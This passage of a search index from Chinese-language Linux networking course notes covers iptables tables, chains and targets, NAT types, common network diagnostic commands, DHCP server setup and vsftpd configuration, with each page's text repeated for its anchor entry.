OUTPUT \u7528\u6765\u9488\u5bf9\u6240\u6709\u672c\u5730\u751f\u6210\u7684\u5305 FORWARD \u4e24\u4e2a\u7f51\u7edc\u8fde\u63a5\u65f6\uff0c\u7528\u4e8e\u4f20\u9012\u6570\u636e\u5305\uff0c\u4e24\u4e2a\u7f51\u7edc\u95f4\u7684\u6570\u636e\u5305\u5fc5\u987b\u6d41\u7ecf\u8be5\u9632\u706b\u5899 POSTROUTING \u7528\u4e8e\u8def\u7531\u5224\u65ad\u540e\u7684\u89c4\u5219\uff0c\u5982\u4fee\u6539\u6e90\u5730\u5740\uff08SNAT\uff09 target\uff1a target \u63cf\u8ff0 ACCEPT \u6ee1\u8db3\u5339\u914d\u6761\u4ef6\u5c31\u63a5\u53d7\u6570\u636e\u5305 DROP \u6ee1\u8db3\u5339\u914d\u6761\u4ef6\u5c31\u4e22\u5f03\u6570\u636e\u5305 REJECT \u548c DROP \u76f8\u4f3c\uff0c\u62e6\u622a\u6570\u636e\u5305\uff0c\u5e76\u8fd4\u56de\u9519\u8bef\u4fe1\u606f SNAT \u6e90\u7f51\u7edc\u5730\u5740\u8f6c\u6362 DNAT \u76ee\u7684\u7f51\u7edc\u5730\u5740\u8f6c\u6362 MASQUERADE \u548c SNAT \u7684\u4f5c\u7528\u76f8\u540c\uff0c\u533a\u522b\u5728\u4e8e\u5b83\u4e0d\u9700\u8981\u6307\u5b9a \u2013to-source REDIRECT \u6ee1\u8db3\u5339\u914d\u6761\u4ef6\u5c31\u5c06\u8f6c\u53d1\u6570\u636e\u5305\u5230\u53e6\u4e00\u4e2a\u7aef\u53e3 NAT\u7c7b\u578b\uff1a \u540d\u79f0 \u5168\u79f0 IP\u5730\u5740\u5bf9\u5e94 \u9759\u6001NAT static NAT \u4e00\u5bf9\u4e00 \u52a8\u6001NAT dynamic NAT\u6216pooled NAT \u591a\u5bf9\u591a NAPT Network Address Port Translation \u591a\u5bf9\u4e00 IN OUT | ^ v | PREROUTING POSTROUTING | ^ ^ v | | Routing Decision ---> FORWARD --------/ | | | v | INPUT --------> localhost -----> OUTPUT \u6570\u636e\u5305\u72b6\u6001\uff1a NEW \uff1a\u6570\u636e\u5305\u5f00\u59cb\u4e00\u4e2a\u65b0\u8fde\u63a5\uff08\u91cd\u65b0\u8fde\u63a5\u6216\u5c06\u8fde\u63a5\u91cd\u5b9a\u5411\uff09 RELATED \uff1a\u6570\u636e\u5305\u662f\u57fa\u4e8e\u67d0\u4e2a\u5df2\u7ecf\u5efa\u7acb\u7684\u8fde\u63a5\u800c\u5efa\u7acb\u7684\u65b0\u8fde\u63a5\u3002 ESTABLISHED \uff1a\u53ea\u8981\u53d1\u9001\u5e76\u63a5\u5230\u5e94\u7b54\uff0c\u4e00\u4e2a\u6570\u636e\u8fde\u63a5\u5c31\u4ece NEW \u53d8\u4e3a ESTABLISHED \uff0c\u800c\u4e14\u8be5\u72b6\u6001\u4f1a\u7ee7\u7eed\u5339\u914d\u8fd9\u4e2a\u8fde\u63a5\u7684\u540e\u7eed\u6570\u636e\u5305\u3002 INVALID \uff1a\u6570\u636e\u5305\u4e0d\u80fd\u88ab\u8bc6\u522b\u5c5e\u4e8e\u54ea\u4e2a\u8fde\u63a5\u6216\u6ca1\u6709\u4efb\u4f55\u72b6\u6001\u7684\uff0c\u6bd4\u5982\u5185\u5b58\u6ea2\u51fa\uff0c\u6536\u5230\u4e0d\u77e5\u5c5e\u4e8e\u54ea\u4e2a\u8fde\u63a5\u7684 ICMP \u9519\u8bef\u4fe1\u606f\uff0c\u4e00\u822c\u4f1a DROP \u8fd9\u4e2a\u72b6\u6001\u7684\u4efb\u4f55\u6570\u636e\u3002 # \u67e5\u770b\u5f53\u524diptables\u7684\u89c4\u5219 # -t \u67e5\u770b\u6307\u5b9a\u7684table\uff08\u9ed8\u8ba4filter\uff09 # -n \u4e0d\u89e3\u6790IP\u548cport # -L \u5217\u4e3eiptables\u7684\u89c4\u5219 # --line \u663e\u793a\u89c4\u5219\u7f16\u53f7 $ sudo iptables [-t table] -nL --line # \u67e5\u770b\u5df2\u7ecf\u751f\u6548\u7684\u89c4\u5219 # -t \u6307\u5b9atable\uff08\u9ed8\u8ba4\u5168\u90e8\uff09 # \u53ef\u4ee5\u91cd\u5b9a\u5411\u4ee5\u4fbf\u6062\u590d $ sudo iptables-save [-t table] # \u6062\u590d\u89c4\u5219 $ sudo iptables-restore < xxx.txt","title":"\u521d\u5b66 iptables"},{"location":"week03/\u521d\u5b66iptables/#iptables","text":"Linux\u9632\u706b\u5899\uff1aNetfilter/iptables Netfilter\uff1a\u5de5\u4f5c\u5728\u5185\u6838\u7a7a\u95f4\uff0c\u6267\u884c\u8fc7\u6ee4 iptables\uff1a\u5de5\u4f5c\u5728\u7528\u6237\u7a7a\u95f4\uff0c\u7f16\u5199\u8fc7\u6ee4\u89c4\u5219 \u8bed\u6cd5\u683c\u5f0f\uff1a iptables [-t table] COMMAND chain CRETIRIA -j target ------------------------------------------------------------------------- | | table | COMMAND | chain | CRETIRIA | target | | |--------|---------|-------------|--------------|------------| | | filter | -A | PREROUTING | -p tcp | ACCEPT | | | nat | -I | FORWARD | udp | DROP | | | | -R | INPUT | -s | REJECT | | iptables | | -D | OUTPUT | -d | SNAT | | | | -P | POSTROUTING | --sport | DNAT | | | | -L | | --dport | MASQUERADE | | | | | | -m limit | REDIRECT | | | | | | connlimit | | | | | | | state | | ------------------------------------------------------------------------- \u8868\uff1a table \u8bf4\u660e \u652f\u6301\u7684\u94fe filter \u9ed8\u8ba4\u7684\u8868\uff0c\u5305\u542b\u8fc7\u6ee4\u89c4\u5219 INPUT\u3001FORWARD\u3001OUTPUT NAT \u5305\u542b\u6e90\u3001\u76ee\u7684\u5730\u5740\u548c\u7aef\u53e3\u8f6c\u6362\u4f7f\u7528\u7684\u89c4\u5219 PREROUTING\u3001OUTPUT\u3001POSTROUTING mangle \u8bbe\u7f6e\u7279\u6b8a\u7684\u6570\u636e\u5305\u8def\u7531\u6807\u5fd7\u7684\u89c4\u5219 \u4e94\u4e2a\u94fe\u90fd\u53ef\u4ee5 raw \u5b9e\u73b0\u6570\u636e\u8ddf\u8e2a\uff0c\u662f\u65b0\u589e\u7684\u8868 PREROUTING\u3001OUTPUT \u4f18\u5148\u7ea7\uff1afilter < NAT < mangle < raw COMMAND \u63cf\u8ff0 -A \u65b0\u589e\u89c4\u5219\uff0c\u5728\u5f53\u524d\u94fe\u7684\u6700\u540e\u65b0\u589e\u4e00\u4e2a\u89c4\u5219 -I \u63d2\u5165\u89c4\u5219\uff0c\u628a\u5f53\u524d\u89c4\u5219\u63d2\u5165\u4e3a\u7b2c\u51e0\u6761 -R \u66ff\u6362/\u4fee\u6539\u7b2c\u51e0\u6761\u89c4\u5219 -D \u5220\u9664\u7b2c\u51e0\u6761\u89c4\u5219 -P \u8bbe\u7f6e\u9ed8\u8ba4\u7b56\u7565 -L \u663e\u793a\u6307\u5b9a\u8868\u548c\u6307\u5b9a\u94fe\u7684\u89c4\u5219 # \u6e05\u9664\u89c4\u5219\u94fe\u4e2d\u5df2\u6709\u7684\u6761\u76ee $ sudo iptables -F # \u6e05\u9664\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u7a7a\u94fe $ sudo iptables -X # \u6e05\u7a7a\u94fe\u548c\u94fe\u4e2d\u9ed8\u8ba4\u89c4\u5219\u7684\u8ba1\u6570\u5668 $ sudo iptables -Z \u94fe\uff1a chain \u63cf\u8ff0 PREROUTING \u7528\u4e8e\u8def\u7531\u5224\u65ad\u524d\u7684\u89c4\u5219\uff0c\u5982\u4fee\u6539\u76ee\u7684\u5730\u5740\uff08DNAT\uff09 INPUT \u6570\u636e\u5305\u901a\u8fc7\u8def\u7531\u8ba1\u7b97\u5224\u65ad\u4e3a\u672c\u5730\u7684 Linux \u7cfb\u7edf\u5219\u901a\u8fc7\u6b64\u94fe\u7684\u68c0\u67e5 OUTPUT \u7528\u6765\u9488\u5bf9\u6240\u6709\u672c\u5730\u751f\u6210\u7684\u5305 FORWARD \u4e24\u4e2a\u7f51\u7edc\u8fde\u63a5\u65f6\uff0c\u7528\u4e8e\u4f20\u9012\u6570\u636e\u5305\uff0c\u4e24\u4e2a\u7f51\u7edc\u95f4\u7684\u6570\u636e\u5305\u5fc5\u987b\u6d41\u7ecf\u8be5\u9632\u706b\u5899 POSTROUTING \u7528\u4e8e\u8def\u7531\u5224\u65ad\u540e\u7684\u89c4\u5219\uff0c\u5982\u4fee\u6539\u6e90\u5730\u5740\uff08SNAT\uff09 target\uff1a target \u63cf\u8ff0 ACCEPT \u6ee1\u8db3\u5339\u914d\u6761\u4ef6\u5c31\u63a5\u53d7\u6570\u636e\u5305 DROP \u6ee1\u8db3\u5339\u914d\u6761\u4ef6\u5c31\u4e22\u5f03\u6570\u636e\u5305 REJECT \u548c DROP \u76f8\u4f3c\uff0c\u62e6\u622a\u6570\u636e\u5305\uff0c\u5e76\u8fd4\u56de\u9519\u8bef\u4fe1\u606f SNAT \u6e90\u7f51\u7edc\u5730\u5740\u8f6c\u6362 DNAT \u76ee\u7684\u7f51\u7edc\u5730\u5740\u8f6c\u6362 MASQUERADE \u548c SNAT \u7684\u4f5c\u7528\u76f8\u540c\uff0c\u533a\u522b\u5728\u4e8e\u5b83\u4e0d\u9700\u8981\u6307\u5b9a \u2013to-source REDIRECT \u6ee1\u8db3\u5339\u914d\u6761\u4ef6\u5c31\u5c06\u8f6c\u53d1\u6570\u636e\u5305\u5230\u53e6\u4e00\u4e2a\u7aef\u53e3 NAT\u7c7b\u578b\uff1a \u540d\u79f0 \u5168\u79f0 IP\u5730\u5740\u5bf9\u5e94 \u9759\u6001NAT static NAT \u4e00\u5bf9\u4e00 \u52a8\u6001NAT dynamic NAT\u6216pooled NAT \u591a\u5bf9\u591a NAPT Network Address Port Translation \u591a\u5bf9\u4e00 IN OUT | ^ v | PREROUTING POSTROUTING | ^ ^ v | | Routing Decision ---> FORWARD --------/ | | | v | INPUT --------> localhost -----> OUTPUT \u6570\u636e\u5305\u72b6\u6001\uff1a NEW \uff1a\u6570\u636e\u5305\u5f00\u59cb\u4e00\u4e2a\u65b0\u8fde\u63a5\uff08\u91cd\u65b0\u8fde\u63a5\u6216\u5c06\u8fde\u63a5\u91cd\u5b9a\u5411\uff09 RELATED \uff1a\u6570\u636e\u5305\u662f\u57fa\u4e8e\u67d0\u4e2a\u5df2\u7ecf\u5efa\u7acb\u7684\u8fde\u63a5\u800c\u5efa\u7acb\u7684\u65b0\u8fde\u63a5\u3002 ESTABLISHED \uff1a\u53ea\u8981\u53d1\u9001\u5e76\u63a5\u5230\u5e94\u7b54\uff0c\u4e00\u4e2a\u6570\u636e\u8fde\u63a5\u5c31\u4ece NEW \u53d8\u4e3a ESTABLISHED \uff0c\u800c\u4e14\u8be5\u72b6\u6001\u4f1a\u7ee7\u7eed\u5339\u914d\u8fd9\u4e2a\u8fde\u63a5\u7684\u540e\u7eed\u6570\u636e\u5305\u3002 INVALID \uff1a\u6570\u636e\u5305\u4e0d\u80fd\u88ab\u8bc6\u522b\u5c5e\u4e8e\u54ea\u4e2a\u8fde\u63a5\u6216\u6ca1\u6709\u4efb\u4f55\u72b6\u6001\u7684\uff0c\u6bd4\u5982\u5185\u5b58\u6ea2\u51fa\uff0c\u6536\u5230\u4e0d\u77e5\u5c5e\u4e8e\u54ea\u4e2a\u8fde\u63a5\u7684 ICMP \u9519\u8bef\u4fe1\u606f\uff0c\u4e00\u822c\u4f1a DROP \u8fd9\u4e2a\u72b6\u6001\u7684\u4efb\u4f55\u6570\u636e\u3002 # \u67e5\u770b\u5f53\u524diptables\u7684\u89c4\u5219 # -t \u67e5\u770b\u6307\u5b9a\u7684table\uff08\u9ed8\u8ba4filter\uff09 # -n \u4e0d\u89e3\u6790IP\u548cport # -L \u5217\u4e3eiptables\u7684\u89c4\u5219 # --line \u663e\u793a\u89c4\u5219\u7f16\u53f7 $ sudo iptables [-t table] -nL --line # \u67e5\u770b\u5df2\u7ecf\u751f\u6548\u7684\u89c4\u5219 # -t \u6307\u5b9atable\uff08\u9ed8\u8ba4\u5168\u90e8\uff09 # \u53ef\u4ee5\u91cd\u5b9a\u5411\u4ee5\u4fbf\u6062\u590d $ sudo iptables-save [-t table] # \u6062\u590d\u89c4\u5219 $ sudo iptables-restore < xxx.txt","title":"\u521d\u5b66iptables"},{"location":"week03/\u7f51\u7edc\u5e38\u7528\u547d\u4ee4/","text":"\u7f51\u7edc\u5e38\u7528\u547d\u4ee4 \u5e38\u89c1HTTP\u72b6\u6001\u7801\uff1a 1xx \u4fe1\u606f\uff0c\u670d\u52a1\u5668\u63a5\u6536\u8bf7\u6c42 2xx \u6210\u529f\uff0c\u64cd\u4f5c\u6210\u529f\u63a5\u6536 3xx \u91cd\u5b9a\u5411\uff0c\u9700\u8981\u8fdb\u4e00\u6b65\u8fdb\u884c\u8bf7\u6c42 4xx \u5ba2\u6237\u7aef\u9519\u8bef\uff0c\u8bf7\u6c42\u51fa\u73b0\u8bed\u6cd5\u9519\u8bef\u6216\u65e0\u6cd5\u5b8c\u6210\u8bf7\u6c42 5xx \u670d\u52a1\u5668\u9519\u8bef\uff0c\u5728\u5904\u7406\u8bf7\u6c42\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u9519\u8bef telnet \u547d\u4ee4\uff1a telnet IP\u5730\u5740 \u7aef\u53e3\u53f7 ping \u547d\u4ee4\uff1a -c \u53d1\u9001\u6307\u5b9a\u6570\u76ee\u7684\u5305 -i \u95f4\u9694\u51e0\u79d2\u53d1\u9001\u4e00\u4e2a\u5305 traceroute \u7528\u4e8e\u4fa6\u6d4b\u4e3b\u673a\u5230\u76ee\u7684\u4e3b\u673a\u4e4b\u95f4\u7ecf\u8fc7\u7684\u8def\u7531\u60c5\u51b5 netstat \u7528\u4e8e\u663e\u793a\u4e0eIP\u3001TCP\u7b49\u534f\u8bae\u76f8\u5173\u7684\u7edf\u8ba1\u6570\u636e\uff0c\u4e00\u822c\u7528\u4e8e\u68c0\u9a8c\u672c\u673a\u5404\u7aef\u53e3\u7684\u7f51\u7edc\u8fde\u63a5\u60c5\u51b5\u3002 -a \u663e\u793a\u6240\u6709\u9009\u9879 -n \u76f4\u63a5\u4f7f\u7528IP\u5730\u5740\uff0c\u4e0d\u89e3\u6790\u57df\u540d -t \u663e\u793aTCP\u4f20\u8f93\u60c5\u51b5 -u \u663e\u793aUDP\u4f20\u8f93\u60c5\u51b5 -l \u663e\u793a\u76d1\u542c\u4e2d\u7684socket -c \u6301\u7eed\u5217\u51fa\u7f51\u7edc\u72b6\u6001 -i \u663e\u793a\u7f51\u5361\u7f51\u7edc\u4fe1\u606f -r \u663e\u793a\u8def\u7531\u8868\u7684\u4fe1\u606f route \u4e3b\u8981\u7528\u4e8e\u663e\u793a\u548c\u64cd\u4f5cIP\u8def\u7531\u8868 mtr \u662f\u5224\u65ad\u7f51\u7edc\u8fde\u901a\u6027\u7684\u5de5\u5177\uff0c\u9700\u8981\u5b89\u88c5\u3002 tcpdump \u662f\u6293\u5305\u5de5\u5177 -nn \u76f4\u63a5\u4ee5IP\u548c\u7aef\u53e3\u53f7\u663e\u793a -i \u6307\u5b9a\u76d1\u542c\u63a5\u53e3 -c \u76d1\u542c\u7684\u5c01\u5305\u6570 -w \u5c06\u76d1\u542c\u7684\u5c01\u5305\u6570\u636e\u4fdd\u5b58\u4e0b\u6765","title":"\u7f51\u7edc\u5e38\u7528\u547d\u4ee4"},{"location":"week03/\u7f51\u7edc\u5e38\u7528\u547d\u4ee4/#_1","text":"\u5e38\u89c1HTTP\u72b6\u6001\u7801\uff1a 1xx \u4fe1\u606f\uff0c\u670d\u52a1\u5668\u63a5\u6536\u8bf7\u6c42 2xx \u6210\u529f\uff0c\u64cd\u4f5c\u6210\u529f\u63a5\u6536 3xx \u91cd\u5b9a\u5411\uff0c\u9700\u8981\u8fdb\u4e00\u6b65\u8fdb\u884c\u8bf7\u6c42 4xx \u5ba2\u6237\u7aef\u9519\u8bef\uff0c\u8bf7\u6c42\u51fa\u73b0\u8bed\u6cd5\u9519\u8bef\u6216\u65e0\u6cd5\u5b8c\u6210\u8bf7\u6c42 5xx \u670d\u52a1\u5668\u9519\u8bef\uff0c\u5728\u5904\u7406\u8bf7\u6c42\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u9519\u8bef telnet \u547d\u4ee4\uff1a telnet IP\u5730\u5740 \u7aef\u53e3\u53f7 ping \u547d\u4ee4\uff1a -c \u53d1\u9001\u6307\u5b9a\u6570\u76ee\u7684\u5305 -i \u95f4\u9694\u51e0\u79d2\u53d1\u9001\u4e00\u4e2a\u5305 traceroute \u7528\u4e8e\u4fa6\u6d4b\u4e3b\u673a\u5230\u76ee\u7684\u4e3b\u673a\u4e4b\u95f4\u7ecf\u8fc7\u7684\u8def\u7531\u60c5\u51b5 netstat \u7528\u4e8e\u663e\u793a\u4e0eIP\u3001TCP\u7b49\u534f\u8bae\u76f8\u5173\u7684\u7edf\u8ba1\u6570\u636e\uff0c\u4e00\u822c\u7528\u4e8e\u68c0\u9a8c\u672c\u673a\u5404\u7aef\u53e3\u7684\u7f51\u7edc\u8fde\u63a5\u60c5\u51b5\u3002 -a \u663e\u793a\u6240\u6709\u9009\u9879 -n \u76f4\u63a5\u4f7f\u7528IP\u5730\u5740\uff0c\u4e0d\u89e3\u6790\u57df\u540d -t \u663e\u793aTCP\u4f20\u8f93\u60c5\u51b5 -u \u663e\u793aUDP\u4f20\u8f93\u60c5\u51b5 -l \u663e\u793a\u76d1\u542c\u4e2d\u7684socket -c \u6301\u7eed\u5217\u51fa\u7f51\u7edc\u72b6\u6001 -i \u663e\u793a\u7f51\u5361\u7f51\u7edc\u4fe1\u606f -r \u663e\u793a\u8def\u7531\u8868\u7684\u4fe1\u606f route \u4e3b\u8981\u7528\u4e8e\u663e\u793a\u548c\u64cd\u4f5cIP\u8def\u7531\u8868 mtr \u662f\u5224\u65ad\u7f51\u7edc\u8fde\u901a\u6027\u7684\u5de5\u5177\uff0c\u9700\u8981\u5b89\u88c5\u3002 tcpdump \u662f\u6293\u5305\u5de5\u5177 -nn \u76f4\u63a5\u4ee5IP\u548c\u7aef\u53e3\u53f7\u663e\u793a -i \u6307\u5b9a\u76d1\u542c\u63a5\u53e3 -c \u76d1\u542c\u7684\u5c01\u5305\u6570 -w \u5c06\u76d1\u542c\u7684\u5c01\u5305\u6570\u636e\u4fdd\u5b58\u4e0b\u6765","title":"\u7f51\u7edc\u5e38\u7528\u547d\u4ee4"},{"location":"week03/\u9632\u706b\u5899\u4ecb\u7ecd/","text":"\u9632\u706b\u5899\u4ecb\u7ecd \u5728Linux\u4e2d\uff0c\u9632\u706b\u5899\u7684\u57fa\u672c\u539f\u7406\u4e3b\u8981\u662f\u5bf9\u6570\u636e\u5305\u7684\u63a7\u5236\uff0c\u901a\u5e38\u7528\u5230\u7684\u662fLinux\u4e0b\u7684Netfilter/iptables\u3002\u6570\u636e\u5305\u6d41\u5165\u6d41\u51fa\u7684\u6d41\u7a0b\uff1a \u9632\u706b\u5899\u7684\u5de5\u4f5c\u6a21\u5f0f\uff1a \u8def\u7531\u6a21\u5f0f\u3002\u91cd\u65b0\u89c4\u5212\u539f\u6709\u7f51\u7edc\u62d3\u6251\uff0c\u76f8\u5f53\u4e8e\u8def\u7531\u5668 \u900f\u660e\u6a21\u5f0f\u3002\u7c7b\u4f3c\u7f51\u6865\uff0c\u9632\u706b\u5899\u5185\u5916\u5904\u4e8e\u540c\u4e00\u5b50\u7f51 \u6df7\u5408\u6a21\u5f0f\u3002\u4e3b\u8981\u7528\u4e8e\u900f\u660e\u6a21\u5f0f\u505a\u53cc\u673a\u5907\u4efd\uff0c\u542f\u52a8VVRP\u914d\u7f6eIP","title":"\u9632\u706b\u5899\u4ecb\u7ecd"},{"location":"week03/\u9632\u706b\u5899\u4ecb\u7ecd/#_1","text":"\u5728Linux\u4e2d\uff0c\u9632\u706b\u5899\u7684\u57fa\u672c\u539f\u7406\u4e3b\u8981\u662f\u5bf9\u6570\u636e\u5305\u7684\u63a7\u5236\uff0c\u901a\u5e38\u7528\u5230\u7684\u662fLinux\u4e0b\u7684Netfilter/iptables\u3002\u6570\u636e\u5305\u6d41\u5165\u6d41\u51fa\u7684\u6d41\u7a0b\uff1a \u9632\u706b\u5899\u7684\u5de5\u4f5c\u6a21\u5f0f\uff1a \u8def\u7531\u6a21\u5f0f\u3002\u91cd\u65b0\u89c4\u5212\u539f\u6709\u7f51\u7edc\u62d3\u6251\uff0c\u76f8\u5f53\u4e8e\u8def\u7531\u5668 \u900f\u660e\u6a21\u5f0f\u3002\u7c7b\u4f3c\u7f51\u6865\uff0c\u9632\u706b\u5899\u5185\u5916\u5904\u4e8e\u540c\u4e00\u5b50\u7f51 \u6df7\u5408\u6a21\u5f0f\u3002\u4e3b\u8981\u7528\u4e8e\u900f\u660e\u6a21\u5f0f\u505a\u53cc\u673a\u5907\u4efd\uff0c\u542f\u52a8VVRP\u914d\u7f6eIP","title":"\u9632\u706b\u5899\u4ecb\u7ecd"},{"location":"week04/Linux_DHCP\u670d\u52a1\u90e8\u7f72\u4e0e\u914d\u7f6e/","text":"Linux DHCP\u670d\u52a1\u90e8\u7f72\u4e0e\u914d\u7f6e DHCP\u7528\u4e8e\u52a8\u6001\u5206\u914dIP\u5730\u5740\u4e0e\u7f51\u5173\u7b49\u53c2\u6570\u3002 DHCP\u5de5\u4f5c\u6d41\u7a0b \u5b89\u88c5dhcp\uff1a # CentOS $ sudo yum install dhcp # Ubuntu $ sudo apt-get install isc-dhcp-server \u914d\u7f6e\u6587\u4ef6\uff1a /etc/dhcp/dhcpd.conf \u57fa\u672c\u914d\u7f6e\u793a\u4f8b\uff1a # \u6ce8\u610f\u4e0d\u8981\u9057\u6f0f\u7ed3\u5c3e\u5904\u7684\u5206\u53f7(;) # \u6839\u636eIP\uff0c\u914d\u7f6e\u5b50\u7f51\u548c\u63a9\u7801 subnet 10.29.113.0 netmask 255.255.255.0 { # \u5206\u914d\u7684\u5730\u5740\u6bb5\uff08\u53ef\u4ee5\u6709\u591a\u4e2a\uff09 range 10.29.113.1 10.29.113.100; # \u914d\u7f6e\u7f51\u5173 option routers 10.29.113.1; # \u7ed1\u5b9a\u9759\u6001\u5730\u5740 host test { hardware ethernet 02:42:c0:a8:00:03; fixed-address 10.29.113.2; } } \u91cd\u542f dhcpd \u6765\u4f7f\u5f97\u914d\u7f6e\u751f\u6548\u3002 \u914d\u7f6eDHCP\u5ba2\u6237\u7aef\uff1a # eth0\u6539\u4e3a\u76f8\u5e94\u7684\u63a5\u53e3\u540d # CentOS # /etc/sysconfig/network-scripts/ifcfg-eth0 DEVICE=eth0 ONBOOT=yes BOOTPROTO=dhcp # Ubuntu # /etc/network/interfaces auto eth0 iface eth0 inet dhcp \u7136\u540e\u91cd\u542f\u7f51\u7edc\u670d\u52a1\uff08 networking \uff09\u751f\u6548\u3002","title":"Linux DHCP \u670d\u52a1\u90e8\u7f72\u4e0e\u914d\u7f6e"},{"location":"week04/Linux_DHCP\u670d\u52a1\u90e8\u7f72\u4e0e\u914d\u7f6e/#linux-dhcp","text":"DHCP\u7528\u4e8e\u52a8\u6001\u5206\u914dIP\u5730\u5740\u4e0e\u7f51\u5173\u7b49\u53c2\u6570\u3002 DHCP\u5de5\u4f5c\u6d41\u7a0b \u5b89\u88c5dhcp\uff1a # CentOS $ sudo yum install dhcp # Ubuntu $ sudo apt-get install isc-dhcp-server \u914d\u7f6e\u6587\u4ef6\uff1a /etc/dhcp/dhcpd.conf \u57fa\u672c\u914d\u7f6e\u793a\u4f8b\uff1a # \u6ce8\u610f\u4e0d\u8981\u9057\u6f0f\u7ed3\u5c3e\u5904\u7684\u5206\u53f7(;) # \u6839\u636eIP\uff0c\u914d\u7f6e\u5b50\u7f51\u548c\u63a9\u7801 subnet 10.29.113.0 netmask 255.255.255.0 { # \u5206\u914d\u7684\u5730\u5740\u6bb5\uff08\u53ef\u4ee5\u6709\u591a\u4e2a\uff09 range 10.29.113.1 10.29.113.100; # \u914d\u7f6e\u7f51\u5173 option routers 10.29.113.1; # \u7ed1\u5b9a\u9759\u6001\u5730\u5740 host test { hardware ethernet 02:42:c0:a8:00:03; fixed-address 10.29.113.2; } } \u91cd\u542f dhcpd \u6765\u4f7f\u5f97\u914d\u7f6e\u751f\u6548\u3002 \u914d\u7f6eDHCP\u5ba2\u6237\u7aef\uff1a # eth0\u6539\u4e3a\u76f8\u5e94\u7684\u63a5\u53e3\u540d # CentOS # /etc/sysconfig/network-scripts/ifcfg-eth0 DEVICE=eth0 ONBOOT=yes BOOTPROTO=dhcp # Ubuntu # /etc/network/interfaces auto eth0 iface eth0 inet dhcp \u7136\u540e\u91cd\u542f\u7f51\u7edc\u670d\u52a1\uff08 networking \uff09\u751f\u6548\u3002","title":"Linux DHCP\u670d\u52a1\u90e8\u7f72\u4e0e\u914d\u7f6e"},{"location":"week04/Linux_FTP\u670d\u52a1\u90e8\u7f72\u4e0e\u914d\u7f6e/","text":"FTP\u662f\u660e\u7801\u4f20\u8f93\uff0c\u5b89\u5168\u6027\u4f4e\u3002FT\u6709\u4e24\u79cd\u6a21\u5f0f\uff1a\u4e3b\u52a8\u6a21\u5f0f\u3001\u88ab\u52a8\u6a21\u5f0f\u3002 \u5b89\u88c5FTP\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7aef\uff1a $ sudo yum install ftp $ sudo yum install vsftpd \u7f16\u8f91\u914d\u7f6e\u6587\u4ef6 /etc/vsftpd/vsftpd.conf \uff1a # \u76d1\u542cipv4 listen=YES # \u76d1\u542cipv6 # listen_ipv6=YES # \u5141\u8bb8\u533f\u540d\u7528\u6237\u767b\u5f55 anonymous_enable=YES # \u533f\u540d\u7528\u6237\u4e0d\u68c0\u9a8c\u5bc6\u7801 no_anon_password=YES # \u6dfb\u52a0\u767b\u5f55\u6210\u529f\u540e\u7684\u6b22\u8fce\u63d0\u793a\uff0cbanner file\u7684\u5185\u5bb9\u4e3a\u6b22\u8fce\u63d0\u793a\u5185\u5bb9 banner_file=/path/to/banner/file # \u533f\u540d\u7528\u6237\u53ea\u80fd\u4e0b\u8f7d\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f\u53ea\u8bfb anon_world_readable_only=YES # \u8bbe\u7f6e\u5199\u5165\u6743\u9650 write_enable=YES # \u533f\u540d\u7528\u6237\u4e0a\u4f20\u6743\u9650 anon_upload_enable=NO # \u533f\u540d\u7528\u6237\u521b\u5efa\u76ee\u5f55\u6743\u9650 anon_mkdir_write_enable=NO # \u533f\u540d\u7528\u6237\u5176\u5b83\u5199\u5165\u6743\u9650\uff08\u5982\u5220\u9664\u3001\u91cd\u547d\u540d\uff09 anon_other_write_enable=NO # \u652f\u6301ASCII\u6a21\u5f0f\u7684\u4e0b\u8f7d\uff08\u4f20\u8f93\u7eaf\u6587\u672c\u6587\u4ef6\u65f6\uff0c\u5c06\u6362\u884c\u7b26\u6362\u6210\u76ee\u7684\u64cd\u4f5c\u7cfb\u7edf\u7684\u6362\u884c\u7b26\uff09 ascii_download_enable=YES # \u533f\u540d\u7528\u6237\u6700\u5927\u6570\u636e\u4f20\u8f93\u7387\uff08\u5355\u4f4d\uff1aB/s\uff09 anon_max_rate=10000000 # \u6700\u5927\u540c\u65f6\u4e0a\u7ebf\u4eba\u6570 max_clients=100 # \u540cIP\u6700\u5927\u8fde\u63a5\u6570 max_per_ip=3 # \u8fde\u63a5\u54cd\u5e94\u8d85\u65f6\u65f6\u95f4 data_connection_timeout=30 # \u4e00\u6bb5\u65f6\u95f4\u6ca1\u54cd\u5e94\u5c31\u65ad\u7ebf\uff08\u5355\u4f4d\uff1as\uff09 idle_session_timeout=300 # \u5141\u8bb8\u8bbf\u5ba2\u767b\u5f55 guest_enable=YES # \u8bbf\u5ba2\u7528\u6237\u7528\u6237\u540d\uff08\u9ed8\u8ba4\uff1aftp\uff09 guest_username=ftp_vuser # \u7528\u6237\u4e3b\u76ee\u5f55\u53ef\u5199 allow_writeable_chroot=YES # \u5141\u8bb8\u672c\u5730\u7528\u6237\u767b\u5f55 local_enable=YES # \u8bbf\u5ba2\u865a\u62df\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u76ee\u5f55 user_config_dir=/path/to/guest/users/config/dir # \u6307\u5b9apam\u8ba4\u8bc1\u6587\u4ef6\uff08\u76ee\u5f55\uff1a/etc/pam.d/\uff09 pam_service_name=vsftpd # \u5141\u8bb8\u672c\u5730\u7528\u6237\u767b\u5f55 local_enable=YES # \u672c\u5730\u7528\u6237\u521b\u5efa\u6587\u4ef6\u7684\u9ed8\u8ba4umask\u6743\u9650 local_umask=022 # \u9650\u5236\u672c\u5730\u7528\u6237\u53ea\u80fd\u8bbf\u95ee\u5bb6\u76ee\u5f55 chroot_local_user=YES # \u5bb6\u76ee\u5f55\u53ef\u5199 allow_writeable_chroot=YES # chroot_local_user=YES\u65f6\uff0cchroot_list_file\u91cc\u7684\u7528\u6237\u53ef\u4ee5\u8bbf\u95ee\u5bb6\u76ee\u5f55\u4ee5\u4e0a\u7684\u76ee\u5f55 # chroot_local_user=NO \u65f6\uff0cchroot_list_file\u91cc\u7684\u7528\u6237\u4e0d\u53ef\u4ee5\u8bbf\u95ee\u5462\u5bb6\u76ee\u5f55\u4ee5\u4e0a\u7684\u76ee\u5f55 chroot_list_enable=YES chroot_list_file=/path/to/chroot/list/file # \u7528\u6237\u8bbf\u95ee\u63a7\u5236\uff0c\u53ef\u4ee5\u8bbe\u7f6e/etc/vsftpd/user_list\u91cc\u7684\u7528\u6237\u80fd\u5426\u767b\u5f55 userlist_enable=YES 